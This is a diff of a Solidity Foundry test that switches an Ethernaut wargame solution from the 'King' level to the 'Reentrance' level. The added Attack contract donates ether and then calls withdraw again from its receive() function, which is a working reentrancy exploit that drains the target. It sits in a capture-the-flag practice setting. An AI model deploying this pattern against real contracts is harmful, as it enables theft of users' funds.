@@ -3,10 +3,10 @@ pragma solidity ^0.8.27;
 
 import {Test, console} from "forge-std/Test.sol";
 import {StdCheats} from "forge-std/StdCheats.sol";
-import "../src/King/KingFactory.sol";
+import "../src/Reentrance/ReentranceFactory.sol";
 import "../src/Ethernaut.sol";
 
-contract KingTest is StdCheats, Test {
+contract ReentranceTest is StdCheats, Test {
     Ethernaut ethernaut;
     address eoaAddress = address(100);
 
@@ -14,24 +14,24 @@ contract KingTest is StdCheats, Test {
         // Setup instance of the Ethernaut contract
         ethernaut = new Ethernaut();
         // Deal EOA address some ether
-        vm.deal(eoaAddress, 5 ether);
+        vm.deal(eoaAddress, 3 ether);
     }
 
-    function testKingHack() public {
+    function testReentranceHack() public {
         /////////////////
         // LEVEL SETUP //
         /////////////////
 
-        KingFactory kingFactory = new KingFactory();
-        ethernaut.registerLevel(kingFactory);
+        ReentranceFactory reentranceFactory = new ReentranceFactory();
+        ethernaut.registerLevel(reentranceFactory);
         vm.startPrank(eoaAddress);
-        address levelAddress = ethernaut.createLevelInstance{value: 1 ether}(kingFactory);
-        King ethernautKing = King(payable(levelAddress));
+        address levelAddress = ethernaut.createLevelInstance{value: 1 ether}(reentranceFactory);
+        Reentrance ethernautReentrance = Reentrance(payable(levelAddress));
 
         //////////////////
         // LEVEL ATTACK //
         //////////////////
-        Attack attack = new Attack{value: 1 ether}(payable(address(ethernautKing)));
+        Attack attack = new Attack{value: 1 ether}(payable(address(ethernautReentrance)));
         attack.attack();
 
         //////////////////////
@@ -52,12 +52,13 @@ contract Attack {
     }
 
     function attack() public {
-        King king = King(payable(target));
-        (bool success,) = address(king).call{value: 1 ether}("");
-        require(success, "");
+        Reentrance reentrance = Reentrance(payable(target));
+        reentrance.donate{value: 1 ether}(address(this));
+        reentrance.withdraw(1 ether);
     }
 
     receive() external payable {
-        revert();
+        Reentrance reentrance = Reentrance(payable(target));
+        reentrance.withdraw(1 ether);
     }
 }
